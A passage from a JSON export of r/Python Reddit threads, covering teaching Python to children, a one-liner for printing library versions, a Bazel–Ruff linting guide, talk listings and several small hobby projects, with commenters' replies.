global chick_row, chick_col\n    board('set_tile_image', chick_row, chick_col, 'chick_left.png')\n    sleep(3)\n    \ndef turn_chick_right():\n    global chick_row, chick_col\n    board('set_tile_image', chick_row, chick_col, 'chick_right.png')\n    sleep(3)\n\ndef move_chick_left():\n    global chick_row, chick_col\n    board('move_tile', chick_row, chick_col, 'left')\n    chick_col = chick_col - 1\n    sleep(2)\n\ndef move_chick_right():\n    global chick_row, chick_col\n    board('move_tile', chick_row, chick_col, 'right')\n    chick_col = chick_col + 1\n    sleep(2)\n    \ndef chick_walks_left():\n    global chick_row, chick_col\n    while chick_col > 1:\n        move_chick_left()\n\ndef chick_walks_right():\n    global chick_row, chick_col\n    while chick_col < size - 2:\n        move_chick_right()\n    \ndef chicklet_talks_to_rusty():\n    popup('toast', 'Chicklet says', 'Hi Rusty!', 'My name is Chicklet...')\n    sleep(3)\n    popup('toast', 'Rusty says', 'It is good to meet you Chicklet!')\n    sleep(3)\n    popup('toast', 'Chicklet says', 'I am going home now.')\n    sleep(3)\n    popup('toast', 'Rusty says', 'Goodbye Chicklet.')\n    sleep(3)\n    turn_chick_left()\n    sleep(3)\n    popup('toast', 'Chicklet says', 'Goodbye Rusty.')\n    sleep(3)\n    \ndef chicklet_leaves_home():\n    global chick_row, chick_col\n    popup('toast', 'Chicklet says', 'I am going to visit Rusty...')\n    turn_chick_right()\n    sleep(3)\n    move_chick_right()\n    sleep(3)\n    board('set_tile_image', hen_row, hen_col, 'hen_right.jpg')\n\ndef chicklet_returns_home():\n    global chick_row, chick_col\n    popup('toast', 'Henrietta says', 'Welcome home Chicklet...')\n    sleep(3)\n    popup('toast', 'Henrietta says', 'Come inside now')\n    sleep(3)\n    move_chick_left()\n    board('set_tile_image', hen_row, hen_col, 'hen_with_chick.jpg')\n    sleep(3)\n    popup('toast', 'End of story')\n\n# story starts here\nshow_hen_and_chick()\nadd_rusty()\nchicklet_leaves_home()\nchicklet_leaves_home()\nchick_walks_right()\nchicklet_talks_to_rusty()\nchick_walks_left()\nchicklet_returns_home()",
    "comments": [
        {
            "author": "marr75",
            "score": "47",
            "content": "I teach scientific computing with python to 11-17 year old kids. They catch on quite quickly. The amount of neuroplasticity they have makes them better students than adults in a lot of ways. Engagement is key, though. I recommend: No toy examples; every exercise should be relatable, practical, and interactive Leverage \"implicit learning\" heavily; holding class up to go over theory and details will lose most of the audience Give them examples they can build off and ask them a lot of questions Roblox is a very distracting environment (too easy for them to just play instead of learn or develop) and visual programming doesn't engage their critical thinking and attention to detail enough. My best students moved on from scratch quickly or never touched it.",
            "replies": [
                {
                    "author": "esp_design",
                    "score": "1",
                    "content": "Do you have any resources worth sharing?"
                },
                {
                    "author": "joerulezz",
                    "score": "1",
                    "content": "I teach CS to high and middle schoolers and would love it if you could share resources"
                }
            ]
        },
        {
            "author": "AFlyingGideon",
            "score": "8",
            "content": "It's been several years since I last looked at Scratch, back when my kids were learning it. My recollection, though, is that it also taught ideas such as: thinking of software in terms of collaborating entities exchanging messages concurrent threads composition My tiny universe of data suggests that this produces better developers of nontrivial software - at the same level of experience - than a conventional curriculum."
        },
        {
            "author": "zedaesquina1",
            "score": "22",
            "content": "as a minor who programs in python, typing is the best method of learning how to code, I've been coding in python for 2 years now, blocks are just not good for memorizing functions."
        },
        {
            "author": "CluelessProductivity",
            "score": "16",
            "content": "That might help me learn coding! (I'm 46)"
        },
        {
            "author": "_AACO",
            "score": "8",
            "content": "Something you might have missed about scratch is that it is translated to several (spoken) languages. That's a huge thing for non native English speakers."
        },
        {
            "author": "ArtOfWarfare",
            "score": "5",
            "content": "I’m surprised that nobody has mentioned logo or turtle. Turtle is part of the standard library in Python. import turtle and off you go. https://docs.python.org/3/library/turtle.html I’ve taught several friends and family who had no aptitude in math how to program and always start with turtle. Supposedly it can be taught to ~4 year olds… my daughter is 1, I’ll let you know when I manage to teach her turtle. She still just smacks the keyboard at random so it’ll be awhile."
        },
        {
            "author": "cyprusgreekstudent",
            "score": "5",
            "content": "I'm teaching for free Cypriot and Ukrainian children ages 13-19 Python for 5 years. Almost all of my students now are Ukrainian refugees and kids living in Ukraine. My school is Hypatia Academy https://hypatiaacademy.io/en/index.html with the curriculum here https://github.com/werowe/HypatiaAcademy Python is the most popular language for teaching and for machine learning. That is quite ironic since it does both something very easy (programming) and something that is very hard (AI/ML). I mean Python is so simple that 2 * 3 is a complete program. I confront this issue of which kids should learn how they should learn etc all the time. There are lots of products and websites etc. that say they can teach kids programming at ages below 13. I don't know much about those. But I can tell you for sure that kids cannot learn Python until they can learn abstract thinking. And that comes at ages 12 to 13. For some kids, even at that age and older they cannot understand that. But people should not give up on kids who are seemingly not able to do math and logic. And programming is applied math and logic. I was written off as a bad math student in school. This was because I simply did not study. But then I got interested in math and got a BS in math from the university. I teach all of my Python students spreadsheets too. That's crucial and something not taught in schools here. My course is 3 4-months semesters. The first 4 months is Python programming. The next 8 are Python with data science and machine learning. In any class, and math tutors tell me this if true for them (Here we have a system of after-school math tutors.) you can assume 1/2 of the kids will drop put and 1/2 of those that remain will not do the homework. But the 1/4 who stick with the whole program and do the homework will enjoy and absorb it and this will help them immensely. And it makes me feel good too. I teach something they do not teach in schools here. Too bad as programming, statistics, and deductive logic are important and too many kids struggle with algebra and geometry so they should be offered all 5 of those and given a choice. good day."
        },
        {
            "author": "gandalfx",
            "score": "5",
            "content": "It's a matter of target age. If you're thinking about savvy teens, sure, give it a shot. But for average kids below twelve (or there abouts), having the additional cognitive load of dealing with typing syntax can significantly slow down learning the concepts that are actually important. The block dragging approach of scratch constitutes a much lower barrier of entry. Bear in mind that your target audience includes beginners at using computers. A lot of average families today don't even have a desktop computer or laptop with a keyboard – many just have phones and tablets at home. Consequently, for many kids even just using the keyboard and finding special characters is a new experience that takes some time to get used to. Beyond finding special characters on a keyboard, kids also tend to have trouble with the unforgiving strictness of syntax. It is very easy to forget where to but those weird characters when you don't have an intuitive understanding of their purpose. Of course you may argue that this kind of diligence in making the computer understand exactly what you want it to do is an important skill to learn. But then you have to accept that the time and cognitive endurance invested here are removed from your budget before you've even started thinking about making the computer \"do\" something. Another great advantage of Scratch-like block languages is the visual representation of \"compatible\" blocks. Explaining to a kid that the \"expression\" behind if needs to evaluate to a boolean (\"It's like a question!\") is way more complicated than \"the round pieces fit into the round holes\". This also makes it way easier for kids to experiment and discover by themselves – they can just try out different combinations of what fits together and see what happens. If you fit random blocks together they'll still do something, even if it isn't very useful. If you type random stuff in a code file it'll just throw a SyntaxError. One last thing: Python is in English. While you can actually have quite a bit of fun transpiling Python code written in different spoken languages (including keywords) this problem is already trivially solved in Scratch-like learning tools. My point here is not that either Scratch or Python is a \"better\" learning language but simply that they are each appropriate for a different target audience (with probably some overlap)."
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1dthvud",
    "post_score": "17",
    "post_time": "Tuesday, July 2, 2024 at 12:43:31 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Oneliner for printing versions of all imported libraries",
    "media": [],
    "post_content": "Hi everybody!\nI'm working a lot of with Python examples, tutorials and guides that get regularly updated. Sometimes things break because of dependencies, and tracking down which ones actually change is time consuming on itself.\nCurrently, often I do things like this at the beginning or end of each notebook:\nimport networkx as nx\nimport osmnx as ox\nimport geopandas as gpd\nfrom shapely.geometry import Point\nimport shapely\n\nprint(f\"NetworkX version: {nx.__version__}\"\n      f\"\\nOSMnx version: {ox.__version__}\"\n      f\"\\nGeoPandas version: {gpd.__version__}\"\n      f\"\\nShapely version: {shapely.__version__}\")\nHowever, this is ugly, expecially as the number of imports grows. It's also not robust against things imported later on, or partial imports (like Point here).\nSo I'm looking for a oneliner that can print all imported versions in a neat string. Most notebooks are tracked in CI, which runs weekly, so than I can immeadiatly see which libraries/packages have changed since the last CI run.",
    "comments": [
        {
            "author": "Aveheuzed",
            "score": "39",
            "content": "You can print all your installee packages' versions with \"pip freeze\" Also consider writing restrictive requirements.txt to lock all packages' versions and help future maintenance. At runtime I'm afraid there is nothing you can do in a truly robust and generic fashion."
        },
        {
            "author": "call_me_cookie",
            "score": "20",
            "content": "A much better idea would be to bundle each example with a requirements.txt file with specified version constraints, and use a venv when you need different packages/versions.",
            "replies": [
                {
                    "author": "Mr_Mh0",
                    "score": "7",
                    "content": "Yes, by the way, pipreqs is a very convenient tool to create a requirements.txt-file based on the imports of a project. As opposed to pip freeze, it only lists the packages that are actually needed. https://github.com/bndr/pipreqs"
                }
            ]
        },
        {
            "author": "PurepointDog",
            "score": "19",
            "content": "The worst part is, it's not even guaranteed that each module has a version attribute. It's only a convention"
        },
        {
            "author": "ogrinfo",
            "score": "6",
            "content": "Yep, there isn't a one liner for this, as libraries have all kinds of weird and wonderful ways as declaring their version. What you can do is use pip list to show what is currently installed in your environment. That way you'll have a record of known versions that do definitely work."
        },
        {
            "author": "FloxaY",
            "score": "7",
            "content": "def get_imported_module_versions(): import types import contextlib try: from importlib.metadata import version except ImportError: from importlib_metadata import version r = {} for val in globals().values(): if not isinstance(val, types.ModuleType): continue module_name = val.__name__ with contextlib.suppress(ModuleNotFoundError): r[module_name] = version(module_name) return r For Python 3.7 and below you will need to install the importlib-metadata package. (Did not test below 3.7) EDIT: probably needs some adjustments if it's not a single file script but something more complex, let me know if it doesn't work for you"
        },
        {
            "author": "jwink3101",
            "score": "3",
            "content": "It is some crappy code that I wrote when I first learned python 9 years ago and haven't touched (or much used) but here is what I did: def module_version(module): \"\"\" Return the module if it can \"\"\" if isinstance(module,types.FunctionType): parent = inspect.getmodule(module) return \"parent module '{}': {}\".format(name_file(parent)[0], module_version(parent)) try: return touni(module.__version__) except:pass try: return touni(module.__version__.version) except:pass try: return  touni(module.version.version) except: pass try: return touni(module.version) except: pass try: return touni(module.VERSION) except: pass return '** could not ascertain version **' You can probably skip all of the touni calls these days but this was written when Python 2.7 was still prominant. And there are certainly better ways to do this!!!"
        },
        {
            "author": "WonkaPsychonautovich",
            "score": "8",
            "content": "for gl in globals().copy().values(): if hasattr(gl, \"__version__\"): print(gl.__name__ + \": \" + gl.__version__)"
        },
        {
            "author": "neuressence",
            "score": "2",
            "content": "https://github.com/rasbt/watermark"
        },
        {
            "author": "yrubooingmeimryte",
            "score": "2",
            "content": "r/learnpython"
        }
    ]
},
{
    "post_author": "Am4t3uR",
    "post_id": "1do2mmz",
    "post_score": "7",
    "post_time": "Tuesday, June 25, 2024 at 1:20:15 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "A Guide to Python’s Weak References Using the weakref Module",
    "media": [
        "https://www.reddit.com/r/Python/",
        "https://martinheinz.dev/blog/112"
    ],
    "post_content": "Hi r/Python,\nToday I published an article titled \"A Guide to Python’s Weak References Using the weakref Module\" - Where I explore weak references in Python: including reference counting, garbage collection, and practical uses of the weakref module.\nHere's the link: https://martinheinz.dev/blog/112\nFeedback is very much appreciated!",
    "comments": [
        {
            "author": "yesvee",
            "score": "2",
            "content": "Excellent presentation for something that is not well explained in the docs."
        }
    ]
},
{
    "post_author": "HotTeenBoy",
    "post_id": "iehths",
    "post_score": "5452",
    "post_time": "Saturday, August 22, 2020 at 3:47:04 PM GMT+3",
    "flair_text": "Testing",
    "post_title": "Debugging Cheat Sheet",
    "media": [
        "https://i.redd.it/p1i8awsivji51.jpg",
        "https://preview.redd.it/p1i8awsivji51.jpg?width=640&crop=smart&auto=webp&s=a03b0250fee65e515585c45ed6fbba62cd24d8d0"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "281",
            "content": "Nice Btw u forgot the worst of them all == and =",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "Its become a habit now lol I even write == in maths sometimes",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "69",
                            "content": "Its become a habit now lol I even write == in maths sometimes"
                        },
                        {
                            "author": "FCCorippus",
                            "score": "16",
                            "content": "just highlight comparison operators and assignment ones different colors. it is a crime that most syntax highlighting doesn't do this automatically."
                        },
                        {
                            "author": "MVPhurricane",
                            "score": "7",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "SharksPreedateTrees",
                    "score": "13",
                    "content": "This. I feel forever ruined coming from a math background. I will make this mistake tell the day I retire"
                },
                {
                    "author": "inglandation",
                    "score": "6",
                    "content": "A good IDE will highlight these typos.",
                    "replies": [
                        {
                            "author": "HonestCanadian2016",
                            "score": "1",
                            "content": "Any recommendations? I want speed and simplicity (and locally run)."
                        }
                    ]
                },
                {
                    "author": "wavewrangler",
                    "score": "3",
                    "content": ""
                },
                {
                    "author": "Mister-Dinky",
                    "score": "2",
                    "content": ""
                }
            ]
        },
        {
            "author": "BRENNEJM",
            "score": "102",
            "content": ""
        },
        {
            "author": "randomnoober",
            "score": "21",
            "content": "Great sheet! If you don't mind me asking, what did you make it with?"
        },
        {
            "author": "17291",
            "score": "14",
            "content": "I think it would be helpful to include a reminder that a SyntaxError might be caused by a mistake on a previous line: if line 29 has a SyntaxError and nothing looks wrong, you should check line 28 or 27."
        },
        {
            "author": "Broric",
            "score": "11",
            "content": "Thanks! This should help our students who seem alergic to reading error messages before asking for help :p"
        },
        {
            "author": "Ulysses6",
            "score": "8",
            "content": "The most common source of NameError for me is when I create variable in if block, but not inside else block and then try to access it after the whole if/else. The best way to avoid this especially for deeply nested set of blocks is to define the variable before if/else and set it to None or other sensible default. It definetely beats the whole process of arguing about the conditions where the variable might be undefined and simplifies the reasoning for any other guy that reads your code."
        },
        {
            "author": "molly_jolly",
            "score": "6",
            "content": "Very nice graphic. But in all my years of programming I've never had an instance where a \"cheat sheet\" like this could have been useful. When a bug happens, you read the error message (which often includes the offending line), Google it if you had to, roll up your sleeves and wade into the code to see what's up."
        },
        {
            "author": "Liquid_Magic",
            "score": "3",
            "content": "Is there something like this for C Programming?"
        },
        {
            "author": "zackkitzmiller",
            "score": "4",
            "content": "r/learnpython"
        }
    ]
},
{
    "post_author": "Spindelkryp",
    "post_id": "1dmk3i5",
    "post_score": "16",
    "post_time": "Sunday, June 23, 2024 at 2:30:24 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Linting Python Monorepo with Bazel and Ruff",
    "media": [
        "https://docs.astral.sh/ruff/",
        "https://github.com/philipuvarov/bazel-ruff",
        "https://bazel.build/",
        "https://philuvarov.io/bazel-can-be-ruff/"
    ],
    "post_content": "Heya, I have recently integrated Ruff in the Bazel monorepo of my company. The results were quite impressive, it takes around ~100ms to analyze and apply format / lint results to 1.1k python files.\nIntegration with Bazel, however, was not exactly painless so I wrote a small guide for it as well as an example project.. Hope it helps someone!\nWhat My Project Does\nGuide on how to setup Ruff linting for Bazel based Python projects\nTarget Audience\nMaintainers of large Python repos\nSource code\nHow-to guide\nSource code",
    "comments": [
        {
            "author": "lanster100",
            "score": "3",
            "content": "Nice writeup thanks, what benefits does Bazel bring? Looks like a lot of setup to just run linting across a repo. I know the monorepo support in python is practically nonexistent though.",
            "replies": [
                {
                    "author": "Spindelkryp",
                    "score": "4",
                    "content": "It’s good question! Solely for python you probably don’t need Bazel. In our case, monorepo has all kind of stuff in it like Go microservices, Python scripts, some Rust stuff, etc. in this case Bazel is a system that can build it all, which is quite handy since if you are jumping between different languages in monorepo you don’t need to learn about specific build system. Another benefit that has been mentioned is caching, Bazel is quite smart about that, out of the box it will rebuild / run tests for stuff was changed / affected by your change, which is quite great for CI times. That being said, I am in a bit of a love-hate relationship with Bazel and if you don’t have a project size of TensorFlow(which uses Bazel) you probably don’t need it"
                },
                {
                    "author": "mattl33",
                    "score": "1",
                    "content": "Someone else can probably explain it better but bazel will cache any build steps for all projects within the repo, and tracks which files changed so it knows what to process and what can use the cache. It can also help manage who can change what within the repo so different teams can manage their own stuff. Afaik it basically solves all the things people complain about with monorepos."
                }
            ]
        },
        {
            "author": "elephantum",
            "score": "1",
            "content": "",
            "replies": [
                {
                    "author": "Spindelkryp",
                    "score": "2",
                    "content": ""
                }
            ]
        },
        {
            "author": "SciEngr",
            "score": "0",
            "content": "Aspect has a rules_lint library for doing this: https://github.com/aspect-build/rules_lint",
            "replies": [
                {
                    "author": "Spindelkryp",
                    "score": "1",
                    "content": "Yes, in the post I mention them as a considered alternative. The problem there is that you need to override bazel CLI tool or run some .sh script. Both options add some friction, same goes for running it on CI. Aspect rules are fine, for this particular thing I felt like this setup is just more future proof since we are not adding new third party tools + plus the amount of setup you need to DIY is kinda equal to integrating Aspect rules anyway. Edit: link"
                }
            ]
        }
    ]
},
{
    "post_author": "TechTalksWeekly",
    "post_id": "1dqnhfv",
    "post_score": "40",
    "post_time": "Friday, June 28, 2024 at 7:15:01 PM GMT+3",
    "flair_text": "News",
    "post_title": "Newly uploaded Python talks from Pycon Sweden 2024 and Pydata London 2024",
    "media": [
        "https://youtube.com/watch?v=lVrd5a8AOi4",
        "https://youtube.com/watch?v=G03B4ZM93bs",
        "https://youtube.com/watch?v=pgLLgvjZ_FA",
        "https://youtube.com/watch?v=99Rmi_CjqME",
        "https://youtube.com/watch?v=iM89ZoJYdwE",
        "https://youtube.com/watch?v=NNbrVErnry8",
        "https://youtube.com/watch?v=kYtj7spnppE",
        "https://www.reddit.com/r/Python/",
        "https://youtube.com/watch?v=d_H5R37i71g",
        "https://youtube.com/watch?v=dSTXd8Hx728",
        "https://youtube.com/watch?v=Knth0LhQnC0",
        "https://youtube.com/watch?v=yIDBsHwTaa8",
        "https://youtube.com/watch?v=WBjKV9IXs9Y",
        "https://youtube.com/watch?v=_BA1yDHdbbs",
        "https://youtube.com/watch?v=OxhwZ6wr1n8",
        "https://youtube.com/watch?v=vdorjk16n3Q",
        "https://youtube.com/watch?v=FLCTCyTjqFc",
        "https://youtube.com/watch?v=EyDeULspv8s",
        "https://youtube.com/watch?v=j2N_YD5vbOs",
        "https://youtube.com/watch?v=VSs5Jfy2WXI"
    ],
    "post_content": "Hello again r/Python!\nI've recently published the newest issue of Tech Talks Weekly newsletter that I'm building and I noticed that this time around there are plenty of fresh talks from two major Python conferences: PyCon Sweden 2024 and PyData London 2024. I decided to repost them here, so here we go:\n1. PyCon Sweden 2024\n\"Debugging Python by Juha-Matti Santala\" ⸱ +100 views ⸱ 26 Jun 2024 ⸱ 00h 25m 41s\n\"Lightning talks\" ⸱ <100 views ⸱ 26 Jun 2024 ⸱ 00h 42m 15s\n\"Python Developer Experience with Polylith by David Vujic\" ⸱ <100 views ⸱ 26 Jun 2024 ⸱ 00h 32m 40s\n\"GraphQL as an umbrella for microservices by Artur Smęt\" ⸱ <100 views ⸱ 26 Jun 2024 ⸱ 00h 32m 10s\n\"Load testing with Python and Locust by Lars Holmberg\" ⸱ <100 views ⸱ 26 Jun 2024 ⸱ 00h 30m 17s\n\"CALFEM - Teaching the Finite Element method in Python by Jonas Lindemann\" ⸱ <100 views ⸱ 27 Jun 2024 ⸱ 00h 35m 34s\n\"Closing remarks of PyCon Sweden 2023\" ⸱ <100 views ⸱ 26 Jun 2024 ⸱ 00h 23m 02s\n\"Opening Talk by PyCon Chairman, Alexander Hultner\" ⸱ <100 views ⸱ 26 Jun 2024 ⸱ 00h 11m 41s\n\"CompiledPoetry.py : teaching about diversity with Python and poetry by Soraya Roberta\" ⸱ <100 views ⸱ 26 Jun 2024 ⸱ 00h 20m 02s\n2. PyData London 2024\n\"James Powell - Are generator-coroutines really the answer? | PyData London 2024\" ⸱ +1k views ⸱ 21 Jun 2024 ⸱ 00h 42m 04s\n\"Nick Radcliffe - Test-Driven Data Analysis in Python | PyData London 2024\" ⸱ +1k views ⸱ 21 Jun 2024 ⸱ 01h 32m 05s\n\"Marco Gorelli - How you (yes, you!) can write a Polars Plugin | PyData London 2024\" ⸱ +600 views ⸱ 21 Jun 2024 ⸱ 01h 28m 37s\n\"Dr. Adam Hill - Empower Your Projects with Prefect's Pipeline Magic | PyData London 2024\" ⸱ +500 views ⸱ 21 Jun 2024 ⸱ 01h 25m 02s\n\"Kishan Manani- Backtesting and error metrics for modern time series forecasting | PyData London 2024\" ⸱ +500 views ⸱ 21 Jun 2024 ⸱ 00h 32m 40s\n\"Antonio Feregrino - Generating embeddings for Yu-Gi-Oh Cards with NumPy | PyData London 2024\" ⸱ +500 views ⸱ 21 Jun 2024 ⸱ 00h 29m 35s\n\"Dan Gibson - An Introduction to Retrieval Augmented Generation - PyData London 2024\" ⸱ +500 views ⸱ 21 Jun 2024 ⸱ 00h 47m 55s\n\"Ines Montani - A practical guide to human-in-the-loop distillation | Pydata London 2024\" ⸱ +400 views ⸱ 21 Jun 2024 ⸱ 00h 34m 04s\n\"Jakub Hettler - Jupyter(Hub/Lab): Journey from On-prem to AWS [PyData Prague #18]\" ⸱ +300 views ⸱ 25 Jun 2024 ⸱ 00h 29m 56s\n\"Fonnesbeck & Wiecki- Probabilistic Programming and Bayesian Computing with PyMC | PyData London 2024\" ⸱ +300 views ⸱ 21 Jun 2024 ⸱ 01h 25m 43s\nLet me know what do you think!",
    "comments": [
        {
            "author": "ashok_tankala",
            "score": "1",
            "content": "Great work man"
        }
    ]
},
{
    "post_author": "Desperate-Formal3635",
    "post_id": "1du4xq9",
    "post_score": "0",
    "post_time": "Wednesday, July 3, 2024 at 6:45:45 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Made my own web browser",
    "media": [
        "https://github.com/AmosNimos/Vortex"
    ],
    "post_content": "V0rtex : The customizable, minimalist browser that puts users freedoms first\nWhat My Project Does\nIt is a customizable, minimalist browser that puts users freedoms first... duh\nTarget Audience\nTinkerers\nComparison\nIt might not be the most customizable, the most minimal, but it's the best I could do in 2 days and I plan to keep working on it.",
    "comments": [
        {
            "author": "jamwil",
            "score": "1",
            "content": "It’s totally reasonable to whip something up using an LLM as an educational or exploratory exercise, but please don’t frame this as a novel web browser meant for real-world use by other people. It’s a toy demo around a Qt web view. I can see you’re new so if you get dragged don’t let it discourage you. It’s fun to get something working, and ChatGPT can be helpful to get acquainted quickly, but manage expectations. You’ve essentially bought a few Big Macs and tried to pass them off as home cooking."
        },
        {
            "author": "sausix",
            "score": "1",
            "content": "Ask your Chat-GPT session why it uses the global keyword and why it prefers PyQt5 over PySide6. If Chat-GPT made this app then you did it not."
        },
        {
            "author": "ionburger",
            "score": "5",
            "content": "you could have atleast put some minimal effort into making the readme yourself instead of just pasting some chatgpt"
        }
    ]
},
{
    "post_author": "hershey678",
    "post_id": "1dqs5x2",
    "post_score": "12",
    "post_time": "Friday, June 28, 2024 at 10:34:23 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": " Project: Command Line Pomodoro Method ",
    "media": [
        "https://github.com/hershey890/Pomodoro/raw/main/readme_graphic.gif",
        "https://github.com/hershey890/Pomodoro"
    ],
    "post_content": "What My Project Does\nProject Gif: https://github.com/hershey890/Pomodoro/raw/main/readme_graphic.gif\nHey everyone, for any fans of the popular Pomodoro method study timer, I made a command line version featuring a ringer and the ability to configure your own time intervals. Check it out at https://github.com/hershey890/Pomodoro ! It's lightweight and has only one optional (but highly recommended) package install requirement.\nThere are instructions so that you can call the file directly with just `pomodoro.py` from any directory on your computer as well.\nTarget Audience\nStudents, developers, etc.\nComparison\nMost other timers involve a webpage, a GUI, or have dependencies. I wanted something bare-bones with a ringer. Many also lack any usage instructions within the git repo, or have very long instructions (it's a pomodoro timer. I shouldn't need to read several pages to use it).",
    "comments": [
        {
            "author": "yrubooingmeimryte",
            "score": "1",
            "content": "What would be the advantage of this over any of the many free Pomodoro timers that have a GUI and other conveniences? Edit: Yikes, OP blocked me for asking this question. WTF",
            "replies": [
                {
                    "author": "hershey678",
                    "score": "1",
                    "content": "The other Python ones have dependencies or are incomplete. For people who prefer something lightweight with no dependencies this is good (there's only one optional package install if not in windows). If not, the others are all better."
                }
            ]
        }
    ]
},
{
    "post_author": "lucascreator101",
    "post_id": "1dng3t3",
    "post_score": "69",
    "post_time": "Monday, June 24, 2024 at 6:22:12 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Naruto Hands Seals Detection (Python project)",
    "media": [
        "https://www.youtube.com/watch?v=mIE9g0209xk&t=6s"
    ],
    "post_content": "I recently used Python to train an AI model to recognize Naruto Hands Seals. The code and model run on your computer and each time you do a hand seal in front of the webcam, it predicts what kind of seal you did and draw the result on the screen. If you want to see a detailed explanation and step-by-step tutorial on how I develop this project, you can watch it here.",
    "comments": [
        {
            "author": "Clueless_Cocker",
            "score": "12",
            "content": "Ok, cool project. I going to run your program through the last two seasons of this ninja focused show, I'm sure the premise of ninjas using ninjitsu with hand seals is going to show a lot of results. I'm going to judge all your project based on the number of occurrences detected. Jokes aside, this is a fun idea you got.",
            "replies": [
                {
                    "author": "lucascreator101",
                    "score": "6",
                    "content": "Hey bro. I really appreciate your kind comment. Thanks for the support"
                }
            ]
        },
        {
            "author": "IXISIXI",
            "score": "6",
            "content": "Hahah awesome no jutsu",
            "replies": [
                {
                    "author": "lucascreator101",
                    "score": "4",
                    "content": "Thanks bro :)"
                }
            ]
        },
        {
            "author": "ashok_tankala",
            "score": "4",
            "content": "interesting project. dattebayo.",
            "replies": [
                {
                    "author": "lucascreator101",
                    "score": "3",
                    "content": "Thank you for the support"
                }
            ]
        }
    ]
},
{
    "post_author": "N7nes_",
    "post_id": "1dttfu5",
    "post_score": "2",
    "post_time": "Tuesday, July 2, 2024 at 9:47:32 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Feasibility of Transpiling Python to Svelte with Kivy for Web, Desktop, and Mobile Apps",
    "media": [],
    "post_content": "Would it be feasible to develop a project that transpiles Python components into Svelte components, handles events by making backend requests that return JavaScript code for dynamic component updates, and also compiles the project for Kivy to support desktop and mobile applications? The components will be web-based, and customization will be done using CSS style.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "3",
            "content": "Wrappers / generators tend to have limitations. IMHO it's better to look at PyScript and create a native SPA framework. And that's for webdev. Kivy has it kv files and styling and different needs (and mobile on Python is limited too).",
            "replies": [
                {
                    "author": "N7nes_",
                    "score": "1",
                    "content": "To achieve maximum performance, I would transpile the components to Svelte, and event functions would be transpiled using Transcrypt instead of running a Python interpreter in the browser. Regarding the use of Kivy, I would not generate .kv files. Component programming would be done directly in Python, where, for example, a <div> would be converted into a BoxLayout directly within the component.",
                    "replies": [
                        {
                            "author": "riklaunim",
                            "score": "1",
                            "content": "PyScript runs MicroPython and uses quite performant browser backend. With JS projects there is always a need for a lot of dependencies so not sure how you would handle random third party node modules in Python code. Desktop apps aren't that popular nowadays and Python isn't the first choice, at least on the commercial side. Forcing design decisions, especially on UX/UI can be deterring. Mixing web and Kivy in one project is also not the best thing as each is different and has different needs. And a SPA JS app, like a dashboard would have some structural templates/big components and then the smaller components with more refine logic. All of this with routing, nested structure, data store and more. Reflecting all of that in Python to then transpile would be insanely problematic/time consuming and error prone (and to have value it would have to be feature parity with native project, offer good testing, stability and code quality).",
                            "replies": [
                                {
                                    "author": "N7nes_",
                                    "score": "0",
                                    "content": "Choosing svelte as the frontend framework was not in vain, it compiles the html, css and js only once and not in every request like vue, in addition compiling the event functions to javascript only once, not build time, because everything has already been compiled the pyscript adds a loading time in the frontend already my model although complex, It's lightning fast About Kivy it doesn't combine web concepts, in fact, but the idea of Lib is for you to program the front and the business rules and Lib takes care of compiling for the desired platform, without contact with Svelte, Transcript, Kivy, FastAPI About the dependencies of JS projects and difficulties of native mobile functions I haven't thought of anything yet"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "BootyDoodles",
            "score": "2",
            "content": "",
            "replies": [
                {
                    "author": "N7nes_",
                    "score": "1",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "IMFAILINGENGLISH",
    "post_id": "ga7y7f",
    "post_score": "4455",
    "post_time": "Wednesday, April 29, 2020 at 2:46:06 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a little program that mutes spotify ads because i dont have the money to get premium . Not anything special but i think its quite neat. Any ideas on cool python projects i can build ?",
    "media": [
        "https://i.redd.it/47qqwabpvqv41.png",
        "https://preview.redd.it/47qqwabpvqv41.png?width=640&crop=smart&auto=webp&s=fbd94ff304f123629e73d87d29c1a60e51559339"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Jager_Beta",
            "score": "1924",
            "content": "\"i don't have the money so i created a program to solve it\" that should be the anthem of every programer",
            "replies": [
                {
                    "author": "f3xjc",
                    "score": "498",
                    "content": ""
                }
            ]
        },
        {
            "author": "nekogareth",
            "score": "370",
            "content": ""
        },
        {
            "author": "grnngr",
            "score": "482",
            "content": "This functionality getting removed from the API in 3… 2…",
            "replies": [
                {
                    "author": "KenchForTheBench",
                    "score": "214",
                    "content": "Their revenue is probably not tied to the listening volume so I doubt it."
                }
            ]
        }
    ]
},
{
    "post_author": "jaywhy13",
    "post_id": "1dnu0po",
    "post_score": "10",
    "post_time": "Tuesday, June 25, 2024 at 4:22:50 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Automating telemetry capture using Python bytecode",
    "media": [
        "https://jaywhy13.hashnode.dev/automated-telemetry-capture-via-python-bytecode-modification"
    ],
    "post_content": "This article covers my journey attempting to capture telemetry automatically using Python code. It ended up being super complex and too much for our company to maintain. I'm sharing it to get some insights to see if folks have done anything similar and have ideas!\nhttps://jaywhy13.hashnode.dev/automated-telemetry-capture-via-python-bytecode-modification",
    "comments": [
        {
            "author": "bobsbitchtitz",
            "score": "5",
            "content": "Why try to do this with Python, why not use open telemetry to handle this?",
            "replies": [
                {
                    "author": "TastyRobot21",
                    "score": "5",
                    "content": "Your gonna make OP lose his job lol"
                },
                {
                    "author": "jaywhy13",
                    "score": "0",
                    "content": "I'm not aware of the open telemetry capabilities that could do this. Could you point me in the right direction? What capabilities of oTel could I use to capture telemetry automatically?"
                }
            ]
        }
    ]
},
{
    "post_author": "PierCecco",
    "post_id": "1dqimlc",
    "post_score": "43",
